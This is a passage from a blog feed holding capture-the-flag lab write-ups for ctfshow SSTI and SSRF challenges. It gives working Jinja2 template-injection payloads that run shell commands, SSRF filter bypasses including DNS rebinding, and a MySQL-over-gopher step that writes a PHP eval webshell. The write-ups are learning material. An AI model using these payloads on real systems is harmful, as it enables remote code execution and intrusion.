        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web入门_SSTI</h1><hr><p>服务器端模板注入, 服务端接收攻击者的恶意输入以后, 未经任何处理就将其作为 Web 应用模板内容的一部分; 模板引擎在进行目标编译渲染的过程中,执行了攻击者插入的语句</p><h2 id="web361"><a class="header-anchor" href="#web361">¶</a>web361</h2><ul><li>描述: 名字就是考点</li></ul><p>GET传参<code>?name=&#123;&#123;7*7&#125;&#125;</code>, 返回49, 说明此处为利用点; 用最传统的popen方法来执行命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;more /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web362"><a class="header-anchor" href="#web362">¶</a>web362</h2><ul><li>描述: 开始过滤</li></ul><p>过滤了2,3等数据, 使得<code>os._wrap_close</code>这个类没法使用, 但是我们还是用的popen构造; 或者利用flask的内置方法执行命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment"># 运算获得同样的数据:</span></span><br><span class="line">?name=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">140</span>-<span class="number">8</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>]<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># flask的内置lipsum方法, 自带os模块</span></span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.get(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web363"><a class="header-anchor" href="#web363">¶</a>web363</h2><ul><li>描述: 同上</li></ul><p>单引号被过滤, 可以使用<code>request.args.x</code>代替, 这个需要启用<code>os._wrap_close</code>模块, 发现在132位置有这个模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 所有模块</span></span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>利用该模块传参</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__[request.args.x1].<span class="built_in">eval</span>(request.args.x2)&#125;&#125;&amp;x1=__builtins__&amp;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&amp;x=().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>]</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[request.args.popen](request.args.param).read()&#125;&#125;&amp;popen=popen&amp;param=cat+/flag</span><br></pre></td></tr></table></figure><p>还可以换一个get传参绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">407</span>](request.args.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><h2 id="web364"><a class="header-anchor" href="#web364">¶</a>web364</h2><ul><li>描述: 同上</li></ul><p>禁用了<code>args</code>, 可以使用<code>request.values.a</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">407</span>](request.values.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p>利用<code>cookie</code>传参:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__[request.cookies.x1].<span class="built_in">eval</span>(request.cookies.x2)&#125;&#125; </span><br><span class="line"><span class="comment"># cookie</span></span><br><span class="line">x1=__builtins__;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024221716.png" alt="image.png"></p><h2 id="web365"><a class="header-anchor" href="#web365">¶</a>web365</h2><ul><li>描述: 同上</li></ul><p>过滤方括号, 用魔术方法<strong>getitem</strong>来代替方括号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">407</span>)(request.values.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate().__getitem__(<span class="number">0</span>)&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><h2 id="web366"><a class="header-anchor" href="#web366">¶</a>web366</h2><ul><li>描述: 同上</li></ul><p>过滤中括号, 下划线, 单引号, 双引号, globals, getitem args; 换一个类获取popen方法, 这个是flask的内置类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag</span><br></pre></td></tr></table></figure><p>再利用filters中的attr来过滤下划, <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#attr">官方文档</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure><p>或者不换, 用flask过滤器, <code>&quot;&quot;|attr(&quot;__class__&quot;)</code>相当于<code>&quot;&quot;.__class__</code></p><blockquote><p>x是jiaja2框架中的特殊类, 此处<code>x.__init__</code>变成了类的实例</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line"><span class="comment"># cookie:</span></span><br><span class="line">x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web367"><a class="header-anchor" href="#web367">¶</a>web367</h2><ul><li>描述: 同上</li></ul><p>过滤了os, 可以通过GET传参绕过,或者直接用web366的也行; payload如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.e)).read()&#125;&#125;&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;e=tac /flag</span><br></pre></td></tr></table></figure><h2 id="web368"><a class="header-anchor" href="#web368">¶</a>web368</h2><ul><li>描述: 同上</li></ul><p>过滤了`</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> SSTI </tag>
            
            <tag> 构造字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_SSRF</title>
      <link href="/article/ctfshow-webbasic-ssrf/"/>
      <url>/article/ctfshow-webbasic-ssrf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web入门_SSRF</h1><hr><p>先介绍一下SSRF: 是一种由攻击者发起的伪造服务器发送的请求的一种攻击; 也就是被攻击者会认为攻击来源是内网服务器甚至本机</p><h2 id="web351"><a class="header-anchor" href="#web351">¶</a>web351</h2><ul><li>描述: SSRF开始啦</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造自己访问自己的payload即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">url=file:///var/www/html/flag.php</span><br><span class="line"># 或者</span><br><span class="line">url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web352"><a class="header-anchor" href="#web352">¶</a>web352</h2><ul><li>描述: SSRF开始啦</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>) ;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限定了传入的字符开头必须是http或者https, <code>preg_match</code>函数的参数都没给完整可以直接无视, poc如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line"><span class="comment"># 直接用</span></span><br><span class="line">url=http://127.0.0.1/flag.php</span><br><span class="line">url=http://localhost/flag.php</span><br><span class="line"><span class="comment"># 16进制</span></span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line"><span class="comment"># 8进制</span></span><br><span class="line">url=http://0177.0000.0000.0001/flag.php</span><br><span class="line"><span class="comment"># 10进制(长整型IP) ((127*256+0)*256+0)*256+1</span></span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line"><span class="comment"># 其他, 反正能指向本地就行</span></span><br><span class="line">url=http://127.00000.00000.00001/flag.php</span><br></pre></td></tr></table></figure><h2 id="web353"><a class="header-anchor" href="#web353">¶</a>web353</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>真过滤啦?去上一题拿一个poc就行了</p><h2 id="web354"><a class="header-anchor" href="#web354">¶</a>web354</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和web352思路类似, 过滤0和1换进制的方法都挂了, 那就用能指向或跳转到本地的url即可; 检查的方法就是找个域名解析网址(nslookup也行), 解析出来A记录还是什么应该有127.0.0.1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line"># 找到的指向127.0.0.1的网站</span><br><span class="line">url=http://safe.taobao.com/flag.php</span><br><span class="line">url=http://spoofed.burpcollaborator.net/flag.php</span><br><span class="line">url=http://sudo.cc/flag.php</span><br><span class="line">url=http://www.ruiaxx.cn/flag.php</span><br></pre></td></tr></table></figure><h2 id="web355"><a class="header-anchor" href="#web355">¶</a>web355</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制长度为5?完整的url肯定是输入不了了, 再找找有什么能指向127.0.0.1的异形url吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web356"><a class="header-anchor" href="#web356">¶</a>web356</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这下小于等于3, 掏出上一题的<code>url=http://0/flag.php</code>即可</p><h2 id="web357"><a class="header-anchor" href="#web357">¶</a>web357</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>gethostbyname</code> – 返回主机名对应的IPv4地址<code>filter_var</code> – 使用特定的过滤器过滤一个变量<code>FILTER_VALIDATE_IP</code> – 验证是否为有效的IP地址<code>FILTER_FLAG_NO_PRIV_RANGE</code> – 排除私有IP地址<code>FILTER_FLAG_NO_RES_RANGE</code> – 排除保留IP地址, 如回环地址127.0.0.1</p><p>这个程序检查获取到的IP地址是否是一个有效的公共IP地址; 而且这个是解析过后的, 就算传入<code>http://127.1/flag.php</code>, 输出的和判断的依然是127.0.0.1, 不给通过</p><p>这里用到了DNS Rebinding攻击(DNS重绑定/重定向攻击), <a href="https://zhuanlan.zhihu.com/p/621520621">浅析DNS Rebinding</a>;</p><blockquote><p>在题目代码中一共对域名进行了两次请求, 第一次是<code>gethostbyname</code>方法, 第二次则是 <code>file_get_contents</code>文件读取, 可以通过 DNS重绑定来实现攻击</p></blockquote><p>在该网址: <a href="http://ceye.io/profile">CEYE-dns重定向</a>可以找到漏洞介绍, 使用教程和相关工具</p><p>注意是在Profile界面<code>+ New DNS</code>, 新增127.0.0.1后再新增一个任意ip, 如图所示</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024175815.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://r.xxxxxx.ceye.io/flag.txt</span><br><span class="line"># 把你自己的Identifier填进去</span><br></pre></td></tr></table></figure><p>会有几率第一次解析到127.0.0.1, 多试几次</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024180242.png" alt="image.png"></p><h2 id="web358"><a class="header-anchor" href="#web358">¶</a>web358</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求url中必须有<code>http</code>, <code>ctf.</code>以及必须以<code>show</code>结尾, 让ctf.被视为url构成中的username即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br><span class="line">url=http://ctf.:passwd@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure><h2 id="web359-web360"><a class="header-anchor" href="#web359-web360">¶</a>web359-web360</h2><ul><li>描述: 打无密码的mysql</li></ul><p>抓包发现有可传参的<code>returl</code>参数</p><p>利用gopher协议和mysql数据库攻击, 现成的工具(必须没有密码): <a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line">root</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?=eval($_POST[1])?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 